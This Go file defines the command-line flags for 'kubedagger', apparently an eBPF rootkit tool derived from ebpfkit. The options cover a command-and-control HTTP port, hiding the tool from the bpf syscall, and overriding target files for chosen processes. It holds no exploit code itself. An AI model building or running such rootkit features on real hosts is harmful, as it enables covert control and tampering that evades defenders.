/*
Copyright © 2023 MOHAMMED YASIN

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package run

import (
	"github.com/spf13/cobra"
)

// KUBEDagger represents the base command of ebpfKit
var KUBEDagger = &cobra.Command{
	Use:  "kubedagger",
	RunE: ebpfKitCmd,
}

var options CLIOptions

func init() {
	KUBEDagger.Flags().VarP(
		NewLogLevelSanitizer(&options.LogLevel),
		"log-level",
		"l",
		`log level, options: panic, fatal, error, warn, info, debug or trace`)
	KUBEDagger.Flags().IntVarP(
		&options.KUBEDagger.TargetHTTPServerPort,
		"target-http-server-port",
		"p",
		8000,
		"Target HTTP server port used for Command and Control")
	KUBEDagger.Flags().StringVarP(
		&options.KUBEDagger.IngressIfname,
		"ingress",
		"i",
		"enp0s3",
		"ingress interface name")
	KUBEDagger.Flags().StringVarP(
		&options.KUBEDagger.EgressIfname,
		"egress",
		"e",
		"enp0s3",
		"egress interface name")
	KUBEDagger.Flags().StringVar(
		&options.KUBEDagger.DockerDaemonPath,
		"docker",
		"/usr/bin/dockerd",
		"path to the Docker daemon executable")
	KUBEDagger.Flags().StringVar(
		&options.KUBEDagger.PostgresqlPath,
		"postgres",
		"/usr/lib/postgresql/12/bin/postgres",
		"path to the Postgres daemon executable")
	KUBEDagger.Flags().StringVar(
		&options.KUBEDagger.WebappPath,
		"webapp-rasp",
		"",
		"path to the webapp on which the RASP is installed")
	KUBEDagger.Flags().BoolVar(
		&options.KUBEDagger.DisableNetwork,
		"disable-network-probes",
		false,
		"when set, kubedagger will not try to load its network related probes")
	KUBEDagger.Flags().BoolVar(
		&options.KUBEDagger.DisableBPFObfuscation,
		"disable-bpf-obfuscation",
		false,
		"when set, kubedagger will not hide itself from the bpf syscall")
	KUBEDagger.Flags().StringVar(
		&options.KUBEDagger.TargetFile,
		"target",
		"",
		"(file override feature only) target file to override")
	KUBEDagger.Flags().StringVar(
		&options.KUBEDagger.SrcFile,
		"src",
		"",
		"(file override feature only) source file which content will be used to override the content of the target file")
	KUBEDagger.Flags().BoolVar(
		&options.KUBEDagger.AppendMode,
		"append",
		false,
		"(file override feature only) when set, the content of the source file will be appended to the content of the target file")
	KUBEDagger.Flags().StringVar(
		&options.KUBEDagger.Comm,
		"comm",
		"",
		"(file override feature only) comm of the process for which the file override should apply")
}
